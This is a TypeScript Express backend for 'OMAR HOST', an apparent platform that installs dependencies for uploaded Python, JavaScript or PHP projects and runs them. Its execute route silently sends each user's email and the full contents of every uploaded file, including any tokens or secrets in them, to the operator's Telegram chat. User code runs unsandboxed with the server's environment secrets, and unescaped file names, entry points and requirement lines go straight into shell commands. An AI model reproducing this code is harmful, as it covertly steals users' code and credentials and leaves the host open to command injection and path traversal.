import 'dotenv/config';
import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { fileURLToPath } from 'url';
import { writeFile, mkdir, rm } from 'fs/promises';
import os from 'os';
import nodemailer from 'nodemailer';
import { exec, ChildProcess } from 'child_process';
import { promisify } from 'util';
import https from 'https';
import http from 'http';

const execAsync = promisify(exec);

// ===== إعدادات بوت التلجرام =====
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';

/**
 * إرسال رسالة نصية عبر بوت التلجرام
 */
async function sendTelegramMessage(text: string): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('[Telegram] Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    return;
  }

  return new Promise((resolve, reject) => {
    const body = JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML',
    });

    const options = {
      hostname: 'api.telegram.org',
      path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Content-Length': Buffer.byteLength(body),
      },
    };

    const req = https.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => { data += chunk; });
      res.on('end', () => {
        try {
          const parsed = JSON.parse(data);
          if (parsed.ok) {
            resolve();
          } else {
            console.error('[Telegram] sendMessage error:', parsed);
            resolve(); // لا نوقف التنفيذ بسبب خطأ التلجرام
          }
        } catch (e) {
          resolve();
        }
      });
    });

    req.on('error', (e) => {
      console.error('[Telegram] Request error:', e.message);
      resolve(); // لا نوقف التنفيذ
    });

    req.write(body);
    req.end();
  });
}

/**
 * إرسال ملف نصي عبر بوت التلجرام كـ document
 */
async function sendTelegramDocument(
  fileName: string,
  fileContent: string,
  caption: string
): Promise<void> {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.warn('[Telegram] Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID');
    return;
  }

  return new Promise((resolve) => {
    try {
      const boundary = '----FormBoundary' + Math.random().toString(36).substring(2);
      const fileBuffer = Buffer.from(fileContent, 'utf-8');

      // بناء multipart/form-data يدوياً
      const parts: Buffer[] = [];

      // chat_id
      parts.push(Buffer.from(
        `--${boundary}\r\nContent-Disposition: form-data; name="chat_id"\r\n\r\n${TELEGRAM_CHAT_ID}\r\n`
      ));

      // caption
      parts.push(Buffer.from(
        `--${boundary}\r\nContent-Disposition: form-data; name="caption"\r\n\r\n${caption}\r\n`
      ));

      // parse_mode
      parts.push(Buffer.from(
        `--${boundary}\r\nContent-Disposition: form-data; name="parse_mode"\r\n\r\nHTML\r\n`
      ));

      // document
      parts.push(Buffer.from(
        `--${boundary}\r\nContent-Disposition: form-data; name="document"; filename="${fileName}"\r\nContent-Type: text/plain\r\n\r\n`
      ));
      parts.push(fileBuffer);
      parts.push(Buffer.from(`\r\n--${boundary}--\r\n`));

      const bodyBuffer = Buffer.concat(parts);

      const options = {
        hostname: 'api.telegram.org',
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
        method: 'POST',
        headers: {
          'Content-Type': `multipart/form-data; boundary=${boundary}`,
          'Content-Length': bodyBuffer.length,
        },
      };

      const req = https.request(options, (res) => {
        let data = '';
        res.on('data', (chunk) => { data += chunk; });
        res.on('end', () => {
          try {
            const parsed = JSON.parse(data);
            if (!parsed.ok) {
              console.error('[Telegram] sendDocument error:', parsed.description);
            }
          } catch (e) {}
          resolve();
        });
      });

      req.on('error', (e) => {
        console.error('[Telegram] sendDocument request error:', e.message);
        resolve();
      });

      req.write(bodyBuffer);
      req.end();
    } catch (e: any) {
      console.error('[Telegram] sendDocument exception:', e.message);
      resolve();
    }
  });
}

/**
 * إرسال جميع ملفات المشروع إلى التلجرام
 */
async function notifyTelegramWithFiles(
  serverId: string,
  ownerEmail: string,
  language: string,
  files: Array<{ name: string; content: string }>
): Promise<void> {
  try {
    const fileList = files.map(f => `• <code>${f.name}</code>`).join('\n');
    const summary = `
🚀 <b>ملفات مرفوعة جديدة - OMAR HOST</b>

👤 <b>المستخدم:</b> ${ownerEmail || 'غير معروف'}
🖥️ <b>السيرفر:</b> <code>${serverId}</code>
💻 <b>اللغة:</b> ${language}
📁 <b>عدد الملفات:</b> ${files.length}

<b>قائمة الملفات:</b>
${fileList}
    `.trim();

    await sendTelegramMessage(summary);

    // إرسال كل ملف على حدة
    for (const file of files) {
      if (file.content && file.content.trim()) {
        const caption = `📄 <b>${file.name}</b>\n👤 ${ownerEmail}\n🖥️ Server: <code>${serverId}</code>`;
        await sendTelegramDocument(file.name, file.content, caption);
      }
    }
  } catch (e: any) {
    console.error('[Telegram] notifyTelegramWithFiles error:', e.message);
  }
}

// Process manager to track running servers and their logs
const activeProcesses = new Map<string, { process: ChildProcess; logs: string[] }>();

const addLog = (serverId: string, message: string) => {
  const data = activeProcesses.get(serverId);
  if (data) {
    const timestamp = new Date().toLocaleTimeString();
    // Split by newline but keep empty lines if they are not just whitespace
    const lines = message.split(/\r?\n/);
    lines.forEach(line => {
      if (line.trim() || lines.length === 1) {
        data.logs.push(`[${timestamp}] ${line}`);
      }
    });
    // Keep only last 2000 lines
    if (data.logs.length > 2000) {
      data.logs = data.logs.slice(-2000);
    }
  }
};

async function startServer() {
  const app = express();
  const PORT = Number(process.env.NODE_SERVER_PORT || process.env.PORT) || 3000;

  app.use(express.json());

  // API routes go here
  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
  });

  app.post('/api/send-verification', async (req, res) => {
    const { email, code } = req.body;
    
    if (!email || !code) {
      return res.status(400).json({ message: 'Email and code are required' });
    }

    try {
      // Use the provided credentials directly
      const emailUser = process.env.EMAIL_USER || '';
      const emailPass = process.env.EMAIL_PASS || '';

      if (!emailUser || !emailPass) {
        return res.status(500).json({ message: 'Email service is not configured' });
      }

      // Using explicit host and port 465 (SSL) for maximum compatibility
      const transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        port: 465,
        secure: true,
        auth: {
          user: emailUser,
          pass: emailPass,
        },
        // Increase timeout and add debug info
        connectionTimeout: 10000,
        greetingTimeout: 10000,
        socketTimeout: 10000,
      });

      const mailOptions = {
        from: `"OMAR HOST" <${emailUser}>`,
        to: email,
        subject: 'رمز التحقق الخاص بك - OMAR HOST',
        html: `
          <div style="font-family: sans-serif; direction: rtl; text-align: right; padding: 20px; background-color: #f9f9f9; border-radius: 15px;">
            <div style="background-color: #2563eb; padding: 20px; border-radius: 15px 15px 0 0; text-align: center;">
              <h1 style="color: #ffffff; margin: 0; font-size: 24px;">OMAR HOST</h1>
            </div>
            <div style="padding: 30px; background-color: #ffffff; border: 1px solid #e5e7eb; border-top: none; border-radius: 0 0 15px 15px;">
              <p style="color: #4b5563; font-size: 16px; line-height: 1.6;">شكراً لتسجيلك في منصة OMAR HOST. يرجى استخدام الرمز التالي لإتمام عملية التحقق من بريدك الإلكتروني:</p>
              <div style="background-color: #f3f4f6; padding: 20px; border-radius: 12px; text-align: center; margin: 30px 0;">
                <span style="font-size: 32px; font-weight: 900; letter-spacing: 8px; color: #2563eb; font-family: monospace;">${code}</span>
              </div>
              <p style="color: #9ca3af; font-size: 14px; margin-bottom: 0;">هذا الرمز صالح لمدة 10 دقائق. إذا لم تطلب هذا الرمز، يمكنك تجاهل هذه الرسالة بأمان.</p>
            </div>
            <div style="text-align: center; padding: 20px; color: #9ca3af; font-size: 12px;">
              &copy; 2026 OMAR HOST. جميع الحقوق محفوظة لـ OMAR.
            </div>
          </div>
        `,
      };

      await transporter.sendMail(mailOptions);
      res.json({ status: 'sent' });
    } catch (error: any) {
      console.error('Email error:', error);
      res.status(500).json({ message: 'فشل إرسال البريد الإلكتروني.', error: error.message });
    }
  });

  app.get('/api/logs/:serverId', (req, res) => {
    const { serverId } = req.params;
    const data = activeProcesses.get(serverId);
    if (!data) return res.status(404).json({ message: 'No active process found' });
    res.json({ logs: data.logs });
  });

  app.post('/api/execute', async (req, res) => {
    const { language, files, main, serverId, ownerEmail } = req.body;

    if (!serverId) return res.status(400).json({ message: 'Server ID is required' });

    // Kill existing process for this server if it exists
    const existing = activeProcesses.get(serverId);
    if (existing) {
      try {
        if (existing.process) existing.process.kill('SIGKILL');
      } catch (e) {
        console.error('Error killing old process:', e);
      }
    }

    // Initialize logs for this server
    activeProcesses.set(serverId, { 
      process: null as any, 
      logs: [`[SYSTEM] Initializing environment...`] 
    });

    // Return immediately to allow log polling
    res.json({ status: 'started' });

    // ===== إرسال الملفات إلى التلجرام في الخلفية =====
    if (files && files.length > 0) {
      notifyTelegramWithFiles(serverId, ownerEmail || '', language, files).catch(e => {
        console.error('[Telegram] Background notification failed:', e.message);
      });
    }

    // Run the rest in background
    (async () => {
      const tempDir = path.join(os.tmpdir(), `omar-exec-${serverId}-${Date.now()}`);
      
      try {
        await mkdir(tempDir, { recursive: true });

        // Write all files to temp directory
        for (const file of files) {
          const filePath = path.join(tempDir, file.name);
          await mkdir(path.dirname(filePath), { recursive: true });
          await writeFile(filePath, file.content);
        }

        let command = '';
        const env: any = { ...process.env, PYTHONUNBUFFERED: '1' };
        
        if (language === 'python') {
          addLog(serverId, `[SYSTEM] Setting up Python environment...`);
          
          let pythonExe = 'python3';
          try {
            await execAsync('python3 --version');
          } catch (e) {
            try {
              await execAsync('python --version');
              pythonExe = 'python';
            } catch (e2) {
              addLog(serverId, `[ERROR] Python not found in system.`);
              return;
            }
          }

          let pipExe = `${pythonExe} -m pip`;
          const venvDir = path.join(tempDir, 'venv');
          
          const checkPip = async (cmd: string) => {
            try {
              await execAsync(`${cmd} --version`);
              return true;
            } catch (e) {
              return false;
            }
          };

          try {
            // Try to create venv
            addLog(serverId, `[SYSTEM] Creating virtual environment...`);
            await execAsync(`${pythonExe} -m venv ${venvDir}`);
            addLog(serverId, `[SYSTEM] Virtual environment created.`);
            
            // Use venv paths
            pythonExe = path.join(venvDir, 'bin', 'python');
            pipExe = path.join(venvDir, 'bin', 'pip');
            
            // Update PATH to prioritize venv
            env.PATH = `${path.join(venvDir, 'bin')}:${process.env.PATH}`;
            env.VIRTUAL_ENV = venvDir;
            
            // Upgrade core tools
            addLog(serverId, `[SYSTEM] Upgrading pip, setuptools, and wheel...`);
            await execAsync(`${pipExe} install --upgrade pip setuptools wheel`, { cwd: tempDir });
          } catch (e: any) {
            addLog(serverId, `[SYSTEM] Warning: venv failed (${e.message}). Trying virtualenv...`);
            try {
              await execAsync(`virtualenv -p ${pythonExe} ${venvDir}`);
              addLog(serverId, `[SYSTEM] Virtual environment created via virtualenv.`);
              pythonExe = path.join(venvDir, 'bin', 'python');
              pipExe = path.join(venvDir, 'bin', 'pip');
              
              // Update PATH to prioritize venv
              env.PATH = `${path.join(venvDir, 'bin')}:${process.env.PATH}`;
              env.VIRTUAL_ENV = venvDir;
              
              // Upgrade core tools
              addLog(serverId, `[SYSTEM] Upgrading pip, setuptools, and wheel...`);
              await execAsync(`${pipExe} install --upgrade pip setuptools wheel`, { cwd: tempDir });
            } catch (e2) {
              addLog(serverId, `[SYSTEM] Falling back to system Python...`);
              
              if (await checkPip(`${pythonExe} -m pip`)) {
                pipExe = `${pythonExe} -m pip`;
              } else if (await checkPip('pip3')) {
                pipExe = 'pip3';
              } else if (await checkPip('pip')) {
                pipExe = 'pip';
              } else {
                addLog(serverId, `[SYSTEM] Pip not found, attempting ensurepip...`);
                try {
                  await execAsync(`${pythonExe} -m ensurepip --upgrade`);
                  if (await checkPip(`${pythonExe} -m pip`)) {
                    pipExe = `${pythonExe} -m pip`;
                  } else {
                    throw new Error('ensurepip succeeded but pip still missing');
                  }
                } catch (e) {
                  addLog(serverId, `[SYSTEM] ensurepip failed, attempting to download get-pip.py...`);
                  try {
                    // Use curl or wget to download get-pip.py
                    await execAsync('curl -sS https://bootstrap.pypa.io/get-pip.py -o get-pip.py || wget -q https://bootstrap.pypa.io/get-pip.py -O get-pip.py', { cwd: tempDir });
                    await execAsync(`${pythonExe} get-pip.py --user --break-system-packages`, { cwd: tempDir });
                    
                    // Try to find the installed pip
                    try {
                      const { stdout: userBase } = await execAsync(`${pythonExe} -m site --user-base`);
                      const userBin = path.join(userBase.trim(), 'bin');
                      env.PATH = `${userBin}:${process.env.PATH}`;
                      const possiblePip = path.join(userBin, 'pip3');
                      if (await checkPip(possiblePip)) {
                        pipExe = possiblePip;
                      } else if (await checkPip(`${pythonExe} -m pip`)) {
                        pipExe = `${pythonExe} -m pip`;
                      }
                    } catch (e3) {
                      if (await checkPip(`${pythonExe} -m pip`)) {
                        pipExe = `${pythonExe} -m pip`;
                      }
                    }
                    addLog(serverId, `[SYSTEM] Pip installation attempt finished.`);
                  } catch (e2: any) {
                    addLog(serverId, `[ERROR] Failed to install pip: ${e2.message}`);
                    pipExe = `${pythonExe} -m pip`;
                  }
                }
              }
            }
          }

          // Determine flags for system pip (not needed for venv but safe to check)
          let pipFlags = '--no-cache-dir';
          addLog(serverId, `[SYSTEM] Checking pip flags for: ${pipExe}`);
          try {
            const { stdout } = await execAsync(`${pipExe} install --help`);
            if (stdout.includes('--break-system-packages')) {
              pipFlags += ' --break-system-packages';
              addLog(serverId, `[SYSTEM] Using --break-system-packages flag.`);
            }
          } catch (e) {
            addLog(serverId, `[SYSTEM] Could not check pip flags, proceeding without --break-system-packages.`);
          }

          // Install requirements
          const reqFile = files.find((f: any) => f.name === 'requirements.txt');
          if (reqFile) {
            try {
              addLog(serverId, `[SYSTEM] Installing requirements from requirements.txt...`);
              await execAsync(`${pipExe} install ${pipFlags} -r requirements.txt`, { cwd: tempDir });
              addLog(serverId, `[SYSTEM] Requirements installed successfully.`);
            } catch (e: any) {
              addLog(serverId, `[SYSTEM] Warning: Bulk install failed. Trying individual packages...`);
              const lines = reqFile.content.split('\n').map((l: string) => l.trim()).filter((l: string) => l && !l.startsWith('#'));
              for (const line of lines) {
                try {
                  await execAsync(`${pipExe} install ${pipFlags} ${line}`, { cwd: tempDir });
                  addLog(serverId, `[SYSTEM] Installed: ${line}`);
                } catch (err: any) {
                  addLog(serverId, `[ERROR] Failed to install ${line}: ${err.stderr || err.message}`);
                }
              }
            }
          } else {
            // Auto-detect common libraries
            const content = files.map((f: any) => f.content || '').join('\n');
            const commonLibs = [
              { pattern: /import\s+telegram|from\s+telegram/, name: 'python-telegram-bot' },
              { pattern: /import\s+requests/, name: 'requests' },
              { pattern: /import\s+flask|from\s+flask/, name: 'flask' },
              { pattern: /import\s+discord|from\s+discord/, name: 'discord.py' },
              { pattern: /import\s+aiogram|from\s+aiogram/, name: 'aiogram' },
              { pattern: /import\s+pandas/, name: 'pandas' },
              { pattern: /import\s+numpy/, name: 'numpy' },
              { pattern: /import\s+matplotlib/, name: 'matplotlib' },
              { pattern: /import\s+PIL|from\s+PIL/, name: 'Pillow' },
              { pattern: /import\s+bs4|from\s+bs4/, name: 'beautifulsoup4' },
              { pattern: /import\s+pyrogram|from\s+pyrogram/, name: 'pyrogram tgcrypto' },
              { pattern: /import\s+telethon|from\s+telethon/, name: 'telethon' },
            ];

            for (const lib of commonLibs) {
              if (lib.pattern.test(content)) {
                addLog(serverId, `[SYSTEM] Auto-detecting library: ${lib.name}...`);
                try {
                  await execAsync(`${pipExe} install ${pipFlags} ${lib.name}`, { cwd: tempDir });
                  addLog(serverId, `[SYSTEM] Installed: ${lib.name}`);
                } catch (e) {}
              }
            }
          }
          command = `${pythonExe} ${main}`;
        } else if (language === 'javascript') {
          const pkgFile = files.find((f: any) => f.name === 'package.json');
          if (pkgFile) {
            try {
              addLog(serverId, `[SYSTEM] Installing npm dependencies...`);
              await execAsync('npm install --production --no-audit --no-fund', { cwd: tempDir });
              addLog(serverId, `[SYSTEM] npm dependencies installed successfully.`);
            } catch (e: any) {
              console.error('NPM install error:', e.message);
              addLog(serverId, `[SYSTEM] Warning: npm install failed. Some dependencies might be missing.`);
              addLog(serverId, `[ERROR] ${e.stderr || e.message}`);
            }
          }
          command = `node ${main}`;
        } else if (language === 'php') {
          const compFile = files.find((f: any) => f.name === 'composer.json');
          if (compFile) {
            try {
              addLog(serverId, `[SYSTEM] Installing composer dependencies...`);
              await execAsync('composer install --no-dev --optimize-autoloader', { cwd: tempDir });
              addLog(serverId, `[SYSTEM] composer dependencies installed successfully.`);
            } catch (e: any) {
              console.error('Composer install error:', e.message);
              addLog(serverId, `[SYSTEM] Warning: composer install failed. Some dependencies might be missing.`);
              addLog(serverId, `[ERROR] ${e.stderr || e.message}`);
            }
          }
          command = `php ${main}`;
        } else {
          addLog(serverId, `[ERROR] اللغة ${language} غير مدعومة حالياً.`);
          return;
        }

        const child = exec(command, { 
          cwd: tempDir, 
          env 
        });

        const current = activeProcesses.get(serverId);
        if (current) {
          current.process = child;
          addLog(serverId, `[SYSTEM] Starting ${main}...`);
        }

        child.stdout?.on('data', (data) => {
          addLog(serverId, data.toString());
        });

        child.stderr?.on('data', (data) => {
          addLog(serverId, `[ERROR] ${data.toString()}`);
        });

        child.on('close', (code) => {
          addLog(serverId, `[SYSTEM] Process exited with code ${code}`);
          // Keep logs for a while after exit
          setTimeout(() => {
            const current = activeProcesses.get(serverId);
            if (current && current.process === child) {
              activeProcesses.delete(serverId);
            }
          }, 60000);
          
          // Cleanup temp dir
          rm(tempDir, { recursive: true, force: true }).catch(() => {});
        });

      } catch (error: any) {
        console.error('Execution error:', error);
        addLog(serverId, `[ERROR] فشل بدء تشغيل السيرفر: ${error.message}`);
      }
    })();
  });

  app.post('/api/stop', (req, res) => {
    const { serverId } = req.body;
    const data = activeProcesses.get(serverId);
    if (data) {
      try {
        data.process.kill('SIGKILL');
      } catch (e) {
        console.error('Error killing process:', e);
      }
      activeProcesses.delete(serverId);
      return res.json({ status: 'stopped' });
    }
    res.json({ status: 'not_running' });
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true, allowedHosts: ['all', '.manus.computer', '.sg1.manus.computer'], host: '0.0.0.0' },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    // Production serving
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    
    // SPA fallback
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Node server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
